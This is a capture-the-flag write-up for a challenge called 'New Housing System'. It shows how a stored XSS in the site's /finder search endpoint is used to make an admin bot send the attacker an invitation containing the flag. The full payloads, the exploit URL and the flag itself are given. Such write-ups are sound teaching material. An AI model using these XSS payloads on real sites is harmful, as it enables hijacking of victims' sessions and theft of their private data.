# New Housing System

## Description
```
After that old portal, we decided to make a new one that is ultra secure and not based off any real housing sites. 
Can you make Samy tell you his deepest darkest secret?

Site - new-housing-portal.chall.lac.tf
Admin Bot - https://admin-bot.lac.tf/new-housing-portal
```

## Provided Files
`new-housing-portal.zip`

## Writeup

Starting off I instantly knew that this was a `XSS` vulnerability. <br/>
In CTF challenges where there is an `admin-bot` to visit a website this is almost always the case. <br/>
Knowing this I searched the flag in the provided code.
```js
users.set('samy', {
  username: 'samy',
  name: 'Samy Kamkar',
  deepestDarkestSecret: process.env.FLAG || 'lactf{test_flag}',
  password: process.env.ADMINPW || 'owo',
  invitations: [],
  registration: Infinity
});
```
In the code above the flag is being injected into a user account. <br/>

```js
const $ = q => document.querySelector(q);
const $all = q => document.querySelectorAll(q);

(async () => {
  const { invitations } = await fetch('/invitation').then(r => r.json());
  $('.invitations').innerHTML = invitations.map((inv) => `
    <div class="invitation">
      <div class="col">
        <div class="from">From: ${inv.from}</div>
        <div class="secret">Deepest Darkest Secret: ${inv.deepestDarkestSecret}</div>
      </div>
      <div class="col">
        <button>Accept</button>
      </div>
    </div>
  `).join('\n');

  $all('button').forEach((button) => {
    button.addEventListener('click', () => {
      alert('Sorry! The System is under load, cannot accept invite!');
    })
  });
})();
```
In the code above the flag would be loaded as `deepestDarkestSecret`. <br/>
Keeping this in mind I searched for the `XSS` entrypoint. <br/>
I was able to find it in the endpoint `/finder` using the query `?q=XSS`. <br/>

Putting this together for a test I created a user with the XSS as the name below. <br/>
```
<img src=1 onerror=alert(1)>
```

After creating this user I visited the URL `https://new-housing-portal.chall.lac.tf/finder/?q=<img src=1 onerror=alert(1)>` which resulted in an alert being executed in my browser. <br/>
Having this working `XSS` vulnerability I now had to forge a `XSS payload` to send an invite to my account so I can put it into an URL and use it on the `admin-bot`. <br/>

After some tampering I found a working payload. <br/>
```js
<img src=1 onerror="fetch('https://new-housing-portal.chall.lac.tf/finder',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=MYACCOUNT'});">

fetch('https://new-housing-portal.chall.lac.tf/finder', {
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'username=MYACCOUNT'
});
```

Taking a look at the javascript code we can see that it takes my username to send a `POST` request with it to the endpoint `/finder`. <br/>
Finished URL: <br/>
```
https://new-housing-portal.chall.lac.tf/finder/?q=<img src=1 onerror="fetch('https://new-housing-portal.chall.lac.tf/finder',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=yeetus_maximus'});">
```

Using this URL in the `admin-bot` I was able to obtain the flag which concludes this writeup. <br/>
```
From: samy
Deepest Darkest Secret: lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}
```
